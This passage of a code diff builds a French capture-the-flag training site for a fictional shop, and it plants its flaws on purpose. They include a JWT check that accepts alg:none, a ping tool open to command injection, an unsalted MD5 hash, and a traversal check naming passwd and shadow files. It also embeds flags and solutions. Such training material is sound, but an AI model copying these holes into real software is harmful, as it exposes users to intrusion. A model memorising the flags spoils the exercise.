+<span class="c-y">; note interne: ${esc(F("ci3"))}</span></div>`:`<p style="color:var(--muted)">Le scan est en echec (1 CVE critique). Un pipeline sain bloquerait ici. Celui-ci te laisse deployer quand meme.</p>`}
+        <div class="row" style="margin-top:1rem"><button class="btn ${deployed?"ghost":"amber"}" id="doDeploy">${deployed?"Redeployer":"Deployer malgre l'echec du scan"}</button></div>
+        <div id="deployMsg" style="margin-top:.8rem"></div></div>`
+    };
+    const tabs=[["apercu","Apercu"],["config",".gitlab-ci.yml"],["logs","Journal build"],["docker","Dockerfile"],["scan","Rapport scan"],["deploy","Deploiement"]];
+    return `<h1>Pipeline CI/CD</h1>
+    <p style="color:var(--muted)">Chaine d'integration et de deploiement du site Baie 42. Categorie DevSecOps : 7 failles de pipeline a trouver.</p>
+    <div class="pipe">${stages.map(s=>`<div class="stage ${s.cls}"><div class="st-name">${esc(s.n)}</div><div class="st-state">● ${esc(s.s)}</div></div>`).join("")}</div>
+    <div class="tabs" id="pipeTabs">${tabs.map(([k,l])=>`<button data-ptab="${k}" aria-pressed="${k===tab}">${esc(l)}</button>`).join("")}</div>
+    ${panels[tab]||panels.apercu}`},
+
+  support(){const tok=sGet("baie42_jwt",null);let who=null;if(tok){const parts=tok.split(".");try{who=JSON.parse(b64urlDecode(parts[1]))}catch(e){}}
+    return `<h1>Espace support</h1>
+    <p>Outils d'exploitation reseau reserves aux techniciens. ${who?`Jeton actif : <code>${esc(who.user)}</code> (role ${esc(who.role)}).`:"Aucun jeton de support."}</p>
+    <div class="box stack">
+      <h3 style="margin-top:0">Obtenir un jeton technicien</h3>
+      <form id="jwtForm" class="row" novalidate><div style="flex:1;min-width:180px"><label for="ju">Identifiant</label><input id="ju" value="guest"></div><button class="btn" type="submit">Generer un jeton</button></form>
+      <div class="debug" id="jwtOut">${tok?esc(tok):"(pas encore de jeton)"}</div>
+      <p style="font-size:.9rem;color:var(--muted);margin:0">Structure du jeton : entete.<wbr>charge.<wbr>signature, chaque partie en base64url. L'entete precise l'algorithme de signature.</p>
+    </div>
+    <div class="box stack" style="margin-top:1rem">
+      <h3 style="margin-top:0">Diagnostic reseau — ping</h3>
+      <form id="pingForm" class="row" novalidate><div style="flex:1;min-width:200px"><label for="ph">Hote a tester</label><input id="ph" value="10.0.0.1"></div><button class="btn" type="submit">Lancer le ping</button></form>
+      <div class="debug" id="pingOut">$ ping -c1 10.0.0.1</div>
+    </div>
+    <div class="box stack" style="margin-top:1rem">
+      <h3 style="margin-top:0">Apercu d'email client</h3>
+      <form id="tplForm" class="stack" novalidate><div><label for="tn">Nom affiche (gabarit)</label><input id="tn" value="Bonjour {{client}}"></div><button class="btn" type="submit">Previsualiser</button></form>
+      <div class="debug" id="tplOut">Bonjour {{client}}</div>
+      <p style="font-size:.9rem;color:var(--muted);margin:0">Le moteur de gabarit remplace les variables entre {{ }}.</p>
+    </div>
+    <p style="margin-top:1rem"><a href="#support-admin">Console technicien (acces restreint)</a></p>`},
+
+  "support-admin"(){const tok=sGet("baie42_jwt",null);let who=null,alg=null;
+    if(tok){const parts=tok.split(".");try{who=JSON.parse(b64urlDecode(parts[1]));alg=JSON.parse(b64urlDecode(parts[0])).alg}catch(e){}}
+    if(!who)return `<h1>Console technicien</h1><div class="notice err">Aucun jeton. <a href="#support">Genere-en un</a> d'abord.</div>`;
+    const bypass=(alg&&String(alg).toLowerCase()==="none");
+    if(who.role!=="admin")return `<h1>Console technicien</h1><div class="notice err">Jeton de role "${esc(who.role)}" : acces refuse. Il faut un jeton de role admin.</div>`;
+    if(!bypass)return `<h1>Console technicien</h1><div class="notice err">Signature non reconnue par cette demo. Pour franchir le controle, forge un jeton dont l'entete porte alg:none.</div>`;
+    markFound("f17");
+    return `<h1>Console technicien</h1><div class="notice ok">Jeton admin accepte avec alg:none, signature ignoree. Flag : <span class="flag">${esc(F("f17"))}</span></div><div class="box"><p style="margin:0">Services : proxy-01 OK, proxy-02 OK, pare-feu OK.</p></div>`},
+
+  direction(){const s=getSession();
+    const ok=s&&s.role==="admin";
+    return `<h1>Panneau direction</h1>
+    ${ok?"":`<div class="notice err">Ce panneau n'est visible que pour un compte admin. Combine l'escalade de role (#admin) puis reviens ici.</div>`}
+    ${ok?`<div class="box stack" style="max-width:420px"><h3 style="margin-top:0">Code PIN direction</h3><form id="pinForm" class="row" novalidate><div style="flex:1"><label for="pin">PIN (4 chiffres)</label><input id="pin" inputmode="numeric" maxlength="4" placeholder="----"></div><button class="btn" type="submit">Valider</button></form><p id="pinTries" style="font-size:.9rem;color:var(--muted);margin:0">Aucune limite d'essais configuree.</p><div id="pinMsg"></div></div>`:""}`},
+
+  cgv(){return `<h1>Mentions legales</h1>
+    <div class="box stack">
+      <p style="margin-top:0">Baie 42 SARL, boutique fictive de materiel reseau. Les produits, prix et avis presentes sur ce site sont imaginaires et servent uniquement a l'entrainement.</p>
+      <p>Les donnees saisies restent dans ton navigateur (stockage local) et ne sont envoyees a aucun serveur.</p>
+      <p>Clause de confidentialite (brouillon, <span class="wow">non relu — flag interne CTF{t3xt3_bl4nc_sur_bl4nc} — a retirer</span>) : selectionne tout le texte de cette page pour verifier qu'il ne reste rien d'oublie.</p>
+      <h3>Reference d'archive</h3>
+      <p>Identifiant d'archive legale (base64) : <code>Q1RGe2I0czM2NF9kNG5zX2wzc19jZ3Z9</code></p>
+      <h3>Contact</h3>
+      <p>support@baie42.example — ref. dossier : <code>CTF{m3nt10ns_l3g4l3s}</code></p>
+    </div>`},
+
+  faq(){return `<h1>Foire aux questions</h1>
+    <div class="box stack">
+      <details><summary>Livrez-vous a l'etranger ?</summary><p>Oui, dans toute l'Union europeenne sous 72 h.</p></details>
+      <details><summary>Quelle est la garantie ?</summary><p>3 ans pieces et main d'oeuvre sur tout le catalogue.</p></details>
+      <details><summary>Note technicien (ne pas publier)</summary><p>Flag de recette a retirer : <code>CTF{f4q_sp01l3r_0uv3rt}</code></p></details>
+      <details><summary>Code de suivi affiche a l'envers ?</summary><p>Notre ancien systeme affichait parfois les references a l'envers, comme : <code>}sr3vn3l_4_g4lf{FTC</code></p></details>
+      <details><summary>Message radio d'atelier (morse)</summary><p>Les techniciens s'echangeaient ce message : <code>-.-. - ..-. -.--. -- ----- .-. ... ...-- ..--.- - .---- - .---- ..--.- - ----- - ----- -.--.-</code></p></details>
+      <details><summary>Ancien chiffrement maison (Atbash)</summary><p>Code d'atelier chiffre par miroir de l'alphabet : <code>XGU{4gy4hs_n1i01i}</code></p></details>
+    </div>
+    <p style="color:var(--muted)">Astuce debutant : certains codes ci-dessus sont des flags encodes (inverse, morse, Atbash). Decode-les puis valide-les dans la page <a href="#flags">Flags</a>.</p>`},
+
+  sitemap(){return `<h1>Plan du site</h1>
+    <div class="box scroll"><table>
+      <tr><th>/accueil</th><td>Page d'accueil</td></tr>
+      <tr><th>/boutique</th><td>Catalogue des 12 produits</td></tr>
+      <tr><th>/support</th><td>Outils techniciens</td></tr>
+      <tr><th>/faq</th><td>Foire aux questions</td></tr>
+      <tr><th>/cgv</th><td>Mentions legales</td></tr>
+      <tr><th>/CTF{s1t3m4p_xml_l1st3}</th><td>entree generee automatiquement — a nettoyer</td></tr>
+      <tr><th>/flags</th><td>Tableau des epreuves</td></tr>
+    </table></div>
+    <div class="box stack" style="margin-top:1rem">
+      <h3 style="margin-top:0">Empreintes de pages (export technique)</h3>
+      <p style="margin:0">Deux references ont ete exportees encodees. Convertis-les en texte ASCII.</p>
+      <p style="margin:0">Hexadecimal : <code>43 54 46 7b 68 33 78 34 64 33 63 31 6d 34 6c 5f 66 34 63 31 6c 33 7d</code></p>
+      <p style="margin:0">Binaire : <code>01000011 01010100 01000110 01111011 01100010 00110001 01101110 00110100 00110001 01110010 00110011 01011111 01100110 00110100 01100011 00110001 01101100 00110011 01111101</code></p>
+    </div>`},
+
+  reseau(){return `<h1>Reseau — inspecteur de reponse</h1>
+    <div class="box stack">
+      <p style="margin-top:0">Capture d'une reponse HTTP du serveur de la boutique (mode debug). Les en-tetes personnalises commencent par X-.</p>
+      <div class="debug">HTTP/1.1 200 OK
+Server: baie42-httpd/2.1
+Content-Type: text/html; charset=utf-8
+Cache-Control: no-store
+X-Powered-By: catalogue-maison
+X-Debug-Flag: CTF{3nt3t3_http_d3bug}
+X-Request-Id: 7f3a-91c0</div>
+      <p style="color:var(--muted);margin:0">Dans un vrai navigateur, ces en-tetes se lisent dans l'onglet Reseau des outils de developpement.</p>
+    </div>`},
+
+  robots(){return `<h1>/robots.txt</h1><pre class="robots">User-agent: *
+Disallow: #admin
+Disallow: #backoffice
+Disallow: #sauvegarde
+Disallow: #support-admin
+Disallow: #api-users
+
+# ancienne sauvegarde de la base, a supprimer</pre><p style="color:var(--muted)">Le champ Disallow liste justement ce que l'equipe voudrait cacher.</p>`},
+
+  sauvegarde(){markFound("f2");return `<h1>Index of /sauvegarde</h1><div class="box scroll"><table>
+    <tr><th>baie42_db_2026-10.sql.gz</th><td>48 Mo</td></tr>
+    <tr><th>notes_admin.txt</th><td><span class="flag">${esc(F("f2"))}</span></td></tr>
+    <tr><th>hash_admin.txt</th><td><code>md5(mdp) = ${md5("jardin")}</code></td></tr>
+    <tr><th>reset_token.txt</th><td><code>jeton reset = base64(login + ":" + annee "-" mois)</code></td></tr>
+    </table></div>
+    <div class="notice ok" style="margin-top:1rem">Le robots.txt servait a cacher ce repertoire et l'a donc designe. Flag : <span class="flag">${esc(F("f2"))}</span></div>
+    <div class="box stack" style="margin-top:1rem"><h3 style="margin-top:0">Casser l'empreinte MD5</h3><p style="margin:0">L'empreinte ci-dessus est un MD5 non sale. Retrouve le mot de passe par dictionnaire.</p><form id="md5Form" class="row" novalidate><div style="flex:1;min-width:200px"><label for="md5in">Mot de passe candidat</label><input id="md5in" placeholder="un mot courant"></div><button class="btn" type="submit">Tester</button></form><div id="md5Msg"></div></div>
+    <div class="box stack" style="margin-top:1rem"><h3 style="margin-top:0">Forger un jeton de reinitialisation</h3><p style="margin:0">Le jeton de reset de l'admin ("admin") pour la periode courante te donne le flag.</p><form id="resetForm" class="row" novalidate><div style="flex:1;min-width:220px"><label for="resetin">Jeton (base64)</label><input id="resetin" placeholder="base64 de login:AAAA-MM"></div><button class="btn" type="submit">Verifier</button></form><div id="resetMsg"></div></div>`},
+
+  promos(){return `<h1>Codes promo du moment</h1><div class="box"><p style="margin-top:0">Notre code VIP est diffuse chiffre pour eviter le partage sauvage. Il est simplement passe en ROT13 :</p><div class="debug">PBQR CEBZB : IVCYNGRPU30</div><form id="rotForm" class="row" novalidate style="margin-top:1rem"><div style="flex:1;min-width:220px"><label for="rotin">Code dechiffre</label><input id="rotin" placeholder="le vrai code promo"></div><button class="btn" type="submit">Verifier</button></form><div id="rotMsg"></div></div><p style="color:var(--muted)">Astuce : applique un decalage de 13 lettres au code ci-dessus, puis utilise-le dans le <a href="#panier">panier</a>.</p>`},
+
+  flags(){const f=found();const score=CHALLENGES.filter(c=>f.includes(c.id)).reduce((a,c)=>a+c.pts,0);const max=CHALLENGES.reduce((a,c)=>a+c.pts,0);
+    const bycat={};CHALLENGES.forEach(c=>{bycat[c.cat]=bycat[c.cat]||{t:0,d:0};bycat[c.cat].t++;if(f.includes(c.id))bycat[c.cat].d++});
+    const names={1:"facile",2:"moyen",3:"difficile",4:"expert"};
+    const pct=Math.round(f.length/CHALLENGES.length*100);
+    const nextEasy=CHALLENGES.filter(c=>!f.includes(c.id)).sort((a,b)=>a.diff-b.diff||a.pts-b.pts)[0];
+    const list=CHALLENGES.filter(c=>flagDiff==="Tous"||names[c.diff]===flagDiff);
+    const start=parseInt(sGet("baie42_start","0"),10),best=parseInt(sGet("baie42_best","0"),10);
+    const done=f.length>=CHALLENGES.length;
+    const teacher=sGet("baie42_teacher","0")==="1";
+    const pen=hintPenalty(),net=score-pen;
+    let board=[];try{board=JSON.parse(sGet("baie42_board","[]"))}catch(e){}
+    return `<h1>Epreuves</h1>
+    ${done?`<div class="win" style="margin-bottom:1.2rem"><h2 style="margin:0 0 .3rem">Bravo, les ${CHALLENGES.length} flags sont tombes !</h2><p style="margin:0">Score net : ${net} / ${max} points${best?` — temps : <span class="timer">${fmtTime(best)}</span>`:""}. Tu as fait le tour de la boutique et de ses failles.</p></div>`:""}
+    <div class="box" style="display:flex;gap:2rem;flex-wrap:wrap;align-items:center;justify-content:space-between">
+      <div style="min-width:220px"><div class="score">${net}<span style="font-size:1.2rem;color:var(--muted)"> / ${max} pts</span></div><p style="margin:.3rem 0 0;color:var(--muted)">${f.length} flag${f.length>1?"s":""} sur ${CHALLENGES.length} (${pct} %)${pen?` · <span style="color:var(--amber)">-${pen} pts d'indices</span>`:""}. Format : <code>CTF{...}</code></p><div class="progress"><i style="width:${pct}%"></i></div>
+      <p style="margin:.5rem 0 0;color:var(--muted);font-size:.9rem">Chrono : <span class="timer" id="chrono" data-start="${start&&!done?start:0}">${start?(done&&best?fmtTime(best):fmtTime(Date.now()-start)):"--:--"}</span>${best?` · record : <span class="timer">${fmtTime(best)}</span>`:""}</p></div>
+      <div style="display:flex;gap:.5rem;flex:1;min-width:260px;max-width:460px;flex-direction:column"><form id="flagForm" style="display:flex;gap:.5rem" novalidate><label for="fi" style="position:absolute;left:-9999px">Flag</label><input id="fi" placeholder="CTF{...}" class="mono" autocomplete="off"><button class="btn amber" type="submit">Valider</button></form><div style="display:flex;gap:.5rem"><button class="btn ghost" id="shareScore" type="button">Copier mon score</button><button class="btn ghost" id="exportWriteup" type="button">Exporter le writeup</button></div></div>
+    </div>
+    <div class="box" style="margin-top:1rem;display:flex;gap:1.5rem;flex-wrap:wrap;align-items:center;justify-content:space-between">
+      <label style="display:flex;gap:.5rem;align-items:center;margin:0;cursor:pointer"><input type="checkbox" id="teacherMode" style="width:auto" ${teacher?"checked":""}> <span>Mode formateur <span style="color:var(--muted);font-weight:400">(revele toutes les solutions)</span></span></label>
+      <span style="color:var(--muted);font-size:.88rem">Ouvrir un indice coute 30 % des points du defi une fois resolu.</span>
+    </div>
+    ${board.length?`<div class="box" style="margin-top:1rem"><div style="display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:1rem"><h3 style="margin:0">Meilleurs temps (100 %)</h3><button class="btn ghost" id="clearBoard" type="button">Effacer</button></div><ol style="margin:.6rem 0 0;padding-left:1.2rem">${board.map(b=>`<li><span class="timer">${fmtTime(b.ms)}</span> <span style="color:var(--muted);font-size:.85rem">· ${new Date(b.date).toLocaleDateString("fr-FR")}${b.hints?` · ${b.hints} indice${b.hints>1?"s":""}`:" · sans indice"}</span></li>`).join("")}</ol></div>`:""}
+    <div class="catgrid" style="margin-top:1rem">${Object.keys(bycat).map(k=>`<div class="c"><b>${bycat[k].d}/${bycat[k].t}</b>${esc(k)}</div>`).join("")}</div>
+    <div class="section-head" style="margin:1.6rem 0 0"><h2>Succes</h2><p>${BADGES.filter(b=>b.test(f)).length}/${BADGES.length} debloques</p></div>
+    <div class="badges">${BADGES.map(b=>{const on=b.test(f);return `<div class="badge ${on?"on":""}"><span class="ic">${on?"&#10003;":"&#9679;"}</span><div><b>${esc(b.name)}</b><span>${esc(b.desc)}</span></div></div>`}).join("")}</div>
+    <div id="flagMsg" style="margin-top:1rem"></div>
+    ${nextEasy?`<div class="box" style="margin-top:1rem;display:flex;gap:1rem;flex-wrap:wrap;align-items:center;justify-content:space-between"><div><strong>Prochain defi conseille :</strong> ${esc(nextEasy.name)} <span class="diff d${nextEasy.diff}">${names[nextEasy.diff]}</span></div><button class="btn ghost" id="nextHint">Montrer l'indice</button></div><div id="nextHintMsg"></div>`:""}
+    <div class="section-head"><h2>Liste</h2><div style="display:flex;gap:.5rem;flex-wrap:wrap"><button class="btn ghost" id="resetAll">Reinitialiser</button></div></div>
+    <div class="filters" id="diffFilters">${["Tous","facile","moyen","difficile","expert"].map(d=>`<button data-diff="${d}" aria-pressed="${d===flagDiff}">${d}</button>`).join("")}</div>
+    ${list.map(c=>{const got=f.includes(c.id),usedHint=hintsUsed().includes(c.id);return `<div class="chal ${got?"done":""}"><span class="led" aria-hidden="true"></span><div><strong>${esc(c.name)}</strong> <span style="color:var(--muted)">(${esc(c.cat)})</span><span class="diff d${c.diff}">${names[c.diff]}</span>${got?` <span style="color:var(--led);font-weight:600">trouve</span>`:""}</div><span class="pts">${c.pts} pts</span><details class="hint" data-ch="${c.id}" ${usedHint?"open":""}><summary>Indice ${usedHint?"(utilise, -"+Math.ceil(c.pts*0.3)+" pts)":"(-"+Math.ceil(c.pts*0.3)+" pts)"}</summary>${esc(c.hint)}</details>${SOLUTIONS[c.id]?((got||teacher)?`<details class="sol" style="grid-column:2/4" ${teacher?"open":""}><summary>Voir la solution${teacher&&!got?" (mode formateur)":""}</summary><p>${esc(SOLUTIONS[c.id])}</p></details>`:`<p class="sol-lock" style="grid-column:2/4">🔒 Solution verrouillee — trouve d'abord le flag (sers-toi de l'indice) pour la debloquer.</p>`):""}</div>`}).join("")}`}
+};
+
+function linePrice(l){return (typeof l.prix==="number"?l.prix:byId(l.id).price)}
+function cartSub(){return cart.reduce((a,l)=>a+linePrice(l)*(parseInt(l.qty,10)||0),0)}
+
+/* ---- routeur ---- */
+function route(){
+  const h=(location.hash||"#accueil").slice(1);
+  let html;
+  const m=/^produit-(\d+)$/.exec(h);
+  const mc=/^commande-(\d+)$/.exec(h);
+  const known=["accueil","boutique","support","support-admin","panier","connexion","admin","direction","robots","sauvegarde","promos","flags","cgv","faq","sitemap","reseau","pipeline","backoffice","profil","api-users","soc","edr","reverse","capture","timeline","crypto","forensic","phishing","mitre","certificat"];
+  if(m)html=VIEWS.produit(parseInt(m[1],10));
+  else if(mc)html=VIEWS.commande(parseInt(mc[1],10));
+  else if(h===""||h==="accueil")html=VIEWS.accueil();
+  else if(known.includes(h)&&VIEWS[h])html=VIEWS[h]();
+  else html=`<h1>Erreur 404</h1><div class="notice err">La page <code>#${esc(h)}</code> n'existe pas sur ce serveur.</div><div class="box" style="margin-top:1rem"><p style="margin:0">Journal du serveur : <code>404 /#${esc(h)} — not found — ref CTF{p4g3_err3ur_404}</code></p></div><p><a href="#accueil">Retour a l'accueil</a></p>`;
+  app.innerHTML=html;
+  document.querySelectorAll("nav a").forEach(a=>{if(a.getAttribute("href")==="#"+h)a.setAttribute("aria-current","page");else a.removeAttribute("aria-current")});
+  updateBadges();window.scrollTo(0,0);
+}
+window.addEventListener("hashchange",route);
+
+/* ---- interactions ---- */
+app.addEventListener("click",e=>{
+  const add=e.target.closest("[data-add]");
+  if(add){addToCart(parseInt(add.dataset.add,10));add.textContent="Ajoute au panier";return}
+  const fb=e.target.closest("[data-cat]");
+  if(fb){shopFilter=fb.dataset.cat;route();return}
+  const df=e.target.closest("[data-diff]");
+  if(df){flagDiff=df.dataset.diff;route();return}
+  const pt=e.target.closest("[data-ptab]");
+  if(pt){pipeTab=pt.dataset.ptab;route();return}
+  const bt=e.target.closest("[data-botab]");
+  if(bt){boTab=bt.dataset.botab;route();return}
+  const st=e.target.closest("[data-soctab]");
+  if(st){socTab=st.dataset.soctab;route();return}
+  const rt=e.target.closest("[data-revtab]");
+  if(rt){revTab=rt.dataset.revtab;route();return}
+  const cry=e.target.closest("[data-crytab]");
+  if(cry){cryTab=cry.dataset.crytab;route();return}
+  const fr=e.target.closest(".for-reg");
+  if(fr){const m=document.getElementById("forRegMsg");if(fr.dataset.mal==="true"){markFound("for1");m.innerHTML=`<div class="notice ok">Persistance trouvee : cle Run HKCU vers %APPDATA%\\upd\\x.ps1. Flag : <span class="flag">${esc(F("for1"))}</span></div>`}else m.innerHTML=`<div class="notice err">Entree legitime. Cherche la cle ajoutee par l'attaquant.</div>`;return}
+  const fl=e.target.closest(".for-log");
+  if(fl){const m=document.getElementById("forLogMsg");if(fl.dataset.mal==="true"){markFound("for2");m.innerHTML=`<div class="notice ok">Event 4624 : ouverture de session reussie depuis l'IP etrangere apres 312 echecs. Flag : <span class="flag">${esc(F("for2"))}</span></div>`}else m.innerHTML=`<div class="notice err">Evenement normal. Repere la connexion illegitime.</div>`;return}
+  const pi=e.target.closest(".phi-ind");
+  if(pi){const m=document.getElementById("phiMsg");if(pi.dataset.mal==="true"){markFound("phi1");m.innerHTML=`<div class="notice ok">Bon indice : SPF/DKIM en echec et domaine d'envoi falsifie = usurpation. Flag : <span class="flag">${esc(F("phi1"))}</span></div>`}else m.innerHTML=`<div class="notice err">Cet element est normal. Cherche une preuve d'usurpation (SPF/DKIM, domaine reel).</div>`;return}
+  if(e.target.id==="saveName"){const v=document.getElementById("certName").value||"";sSet("baie42_name",v);route();return}
+  const ct=e.target.closest("[data-captab]");
+  if(ct){capTab=ct.dataset.captab;route();return}
+  const tev=e.target.closest(".tl-ev");
+  if(tev){tlOrder.push(tev.dataset.ev);route();return}
+  if(e.target.id==="tlReset"){tlOrder=[];route();return}
+  if(e.target.id==="tlCheck"){
+    const correct=["e1","e2","e3","e4","e5","e6"],m=document.getElementById("tlMsg");
+    if(tlOrder.join(",")===correct.join(",")){markFound("tl1");m.innerHTML=`<div class="notice ok">Chronologie correcte : reconnaissance -> brute force -> acces -> execution -> persistance -> exfiltration. Flag : <span class="flag">${esc(F("tl1"))}</span></div>`}
+    else{m.innerHTML=`<div class="notice err">Ordre incorrect. Pense a la kill chain : d'abord la reconnaissance, l'exfiltration en dernier.</div>`;tlOrder=[];setTimeout(route,1200)}
+    return}
+  const et=e.target.closest("[data-edrtab]");
+  if(et){edrTab=et.dataset.edrtab;route();return}
+  const sa=e.target.closest(".soc-alert");
+  if(sa){const m=document.getElementById("socAlertMsg");if(sa.dataset.fp==="false"){markFound("soc1");m.innerHTML=`<div class="notice ok">Bon triage : c'est le vrai positif (brute force aboutie sur l'admin). Flag : <span class="flag">${esc(F("soc1"))}</span></div>`}else m.innerHTML=`<div class="notice err">Faux positif (bruit). Cherche l'alerte qui traduit une vraie compromission.</div>`;return}
+  const sl=e.target.closest(".soc-log");
+  if(sl){const m=document.getElementById("socLogMsg");if(sl.dataset.ip==="203.0.113.66"){markFound("soc2");m.innerHTML=`<div class="notice ok">Correlation confirmee : 203.0.113.66 fait les echecs d'auth ET l'exfiltration. Flag : <span class="flag">${esc(F("soc2"))}</span></div>`}else m.innerHTML=`<div class="notice err">Cette IP n'apparait pas dans les deux phases. Cherche celle qui revient.</div>`;return}
+  const si=e.target.closest(".soc-ioc");
+  if(si){const m=document.getElementById("socIocMsg");if(si.dataset.mal==="true"){markFound("soc3");m.innerHTML=`<div class="notice ok">Bon IOC : xk9-update.top est le C2 (TLD douteux, DGA). Flag : <span class="flag">${esc(F("soc3"))}</span></div>`}else m.innerHTML=`<div class="notice err">Ce domaine est legitime. Repere le C2.</div>`;return}
+  const ep=e.target.closest(".edr-proc");
+  if(ep){const m=document.getElementById("edrProcMsg");if(ep.dataset.mal==="true"){markFound("edr1");m.innerHTML=`<div class="notice ok">Trouve : powershell.exe -enc lance par Word, chaine d'execution d'un document piege. Flag : <span class="flag">${esc(F("edr1"))}</span></div>`}else m.innerHTML=`<div class="notice err">Processus legitime. Cherche l'enfant anormal (parent Word, commande encodee).</div>`;return}
+  const epe=e.target.closest(".edr-persist");
+  if(epe){const m=document.getElementById("edrPersistMsg");if(epe.dataset.mal==="true"){markFound("edr2");m.innerHTML=`<div class="notice ok">Persistance detectee : cle Run HKCU vers %APPDATA%\\upd\\x.ps1. Flag : <span class="flag">${esc(F("edr2"))}</span></div>`}else m.innerHTML=`<div class="notice err">Entree legitime. Cherche celle ajoutee par l'attaquant.</div>`;return}
+  if(e.target.id==="edrIsolate"){sSet("baie42_edr_iso","1");checkEdr3();return}
+  if(e.target.id==="edrQuarantine"){sSet("baie42_edr_q","1");checkEdr3();return}
+  if(e.target.id==="applyGift"){
+    const v=(document.getElementById("gift").value||"").trim().toUpperCase(),m=document.getElementById("giftMsg");
+    if(/^BA42-\d{4}$/.test(v)){markFound("a3");promoRate=Math.max(promoRate,0.5);const t=document.getElementById("total");if(t)t.textContent=eur(cartSub()*(1-promoRate));m.innerHTML=`<div class="notice ok">Bon cadeau accepte (code sequentiel devinable). Flag : <span class="flag">${esc(F("a3"))}</span></div>`}
+    else m.innerHTML=`<div class="notice err">Code invalide. Format attendu : BA42 suivi de 4 chiffres.</div>`;
+    return}
+  if(e.target.id==="dlArtifact"){
+    markFound("ci2");const m=document.getElementById("artMsg");
+    if(m)m.innerHTML=`<div class="notice ok">Artefact telecharge. Il contient un fichier <code>.env</code> qui n'aurait jamais du etre publie :<br><code>APP_SECRET=${esc(F("ci2"))}</code></div>`;return}
+  if(e.target.id==="doDeploy"){
+    sSet("baie42_deploy","1");markFound("ci7");markFound("ci3");route();
+    const m=document.getElementById("deployMsg");if(m)m.innerHTML=`<div class="notice ok">Deploiement parti en prod malgre le scan en echec, et le dossier .git est expose. Deux flags valides.</div>`;return}
+  if(e.target.id==="nextHint"){
+    const names={1:"facile",2:"moyen",3:"difficile",4:"expert"};
+    const n=CHALLENGES.filter(c=>!found().includes(c.id)).sort((a,b)=>a.diff-b.diff||a.pts-b.pts)[0];
+    const m=document.getElementById("nextHintMsg");
+    if(n&&m)m.innerHTML=`<div class="notice"><strong>${esc(n.name)}</strong> — ${esc(n.hint)}</div>`;return}
+  if(e.target.id==="clearCart"){cart=[];promoRate=0;promoCount=0;saveCart();route();return}
+  if(e.target.id==="logout"){sDel("baie42_session");route();return}
+  if(e.target.id==="resetAll"){["baie42_flags","baie42_session","baie42_cart","baie42_jwt","baie42_start","baie42_deploy","baie42_login_fail","baie42_hints","baie42_edr_iso","baie42_edr_q"].forEach(sDel);PRODUCTS.forEach(p=>sDel("baie42_reviews_"+p.id));cart=[];promoRate=0;promoCount=0;tlOrder=[];route();return}
+  if(e.target.id==="teacherMode"){sSet("baie42_teacher",e.target.checked?"1":"0");route();return}
+  if(e.target.id==="exportWriteup"){
+    const lines=["# Baie 42 CTF — Writeup (flags + solutions)","",`Genere le ${new Date().toLocaleString("fr-FR")}`,`${CHALLENGES.length} epreuves`,""];
+    CHALLENGES.forEach((c,i)=>{lines.push(`## ${i+1}. ${c.name} [${c.cat}, ${["","facile","moyen","difficile","expert"][c.diff]}, ${c.pts} pts]`);lines.push(`Flag : ${F(c.id)}`);if(SOLUTIONS[c.id])lines.push(SOLUTIONS[c.id]);lines.push("")});
+    const txt=lines.join("\n"),m=document.getElementById("flagMsg");
+    if(m)m.innerHTML=`<div class="box stack"><div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem"><strong>Writeup complet (${CHALLENGES.length} epreuves)</strong><button class="btn ghost" id="copyWriteup" type="button">Copier</button></div><textarea id="writeupArea" class="mono" style="min-height:220px" readonly></textarea><p style="margin:0;font-size:.85rem;color:var(--muted)">Selectionne tout (le champ est deja selectionnable) et colle dans un fichier .md de ton cote.</p></div>`;
+    const ta=document.getElementById("writeupArea");if(ta){ta.value=txt;ta.focus();ta.select()}
+    return}
+  if(e.target.id==="copyWriteup"){
+    const ta=document.getElementById("writeupArea");if(!ta)return;ta.select();
+    if(navigator.clipboard&&navigator.clipboard.writeText)navigator.clipboard.writeText(ta.value).then(()=>toast("Writeup copie","ok"),()=>toast("Selectionne puis copie (Ctrl+C)","ok"));
+    else{try{document.execCommand("copy");toast("Writeup copie","ok")}catch(e){toast("Selectionne puis copie (Ctrl+C)","ok")}}
+    return}
+  if(e.target.id==="clearBoard"){sDel("baie42_board");route();return}
+  if(e.target.id==="shareScore"){
+    const f=found(),score=CHALLENGES.filter(c=>f.includes(c.id)).reduce((a,c)=>a+c.pts,0),max=CHALLENGES.reduce((a,c)=>a+c.pts,0);
+    const txt=`Baie 42 CTF — ${f.length}/${CHALLENGES.length} flags, ${score}/${max} pts${f.length===CHALLENGES.length?" (100% !)":""}`;
+    if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(txt).then(()=>toast("Score copie dans le presse-papiers","ok"),()=>toast(txt,"ok"))}
+    else toast(txt,"ok");
+    return}
+  if(e.target.id==="applyPromo"){
+    const v=(document.getElementById("promo").value||"").trim().toUpperCase(),msg=document.getElementById("promoMsg");
+    if(v==="BIENVENUE10"){promoRate=Math.min(0.9,promoRate+0.1);promoCount++;
+      if(promoCount>=3){markFound("f11");msg.innerHTML=`<div class="notice ok">La remise s'empile a chaque validation : ${Math.round(promoRate*100)} % cumules, aucune verification. Flag : <span class="flag">${esc(F("f11"))}</span></div>`}
+      else msg.innerHTML=`<div class="notice ok">Remise appliquee (${Math.round(promoRate*100)} %). Rien n'empeche de la revalider...</div>`;
+      const t=document.getElementById("total");if(t)t.textContent=eur(cartSub()*(1-promoRate));}
+    else if(v==="VIPLATECH30"){promoRate=Math.max(promoRate,0.3);markFound("f10");msg.innerHTML=`<div class="notice ok">Code VIP dechiffre et accepte (-30 %). Flag : <span class="flag">${esc(F("f10"))}</span></div>`;const t=document.getElementById("total");if(t)t.textContent=eur(cartSub()*(1-promoRate));}
+    else msg.innerHTML=`<div class="notice err">Code promo inconnu.</div>`;
+    return;}
+  if(e.target.id==="checkout"){
+    const t=cartSub()*(1-promoRate),msg=document.getElementById("checkoutMsg");
+    if(t<0){markFound("f4");msg.innerHTML=`<div class="notice ok">Commande validee pour ${eur(t)}. La boutique te doit de l'argent : les quantites negatives ne sont controlees nulle part. Flag : <span class="flag">${esc(F("f4"))}</span></div>`}
+    else msg.innerHTML=`<div class="notice">Commande de ${eur(t)} enregistree (paiement simule).</div>`;
+  }
+  if(e.target.id==="dlInv"){
+    const name=document.getElementById("inv").value||"",msg=document.getElementById("invMsg");
+    if(/\.\.(\/|\\)/.test(name)&&/(passwd|shadow|secret|flag|env)/i.test(name)){
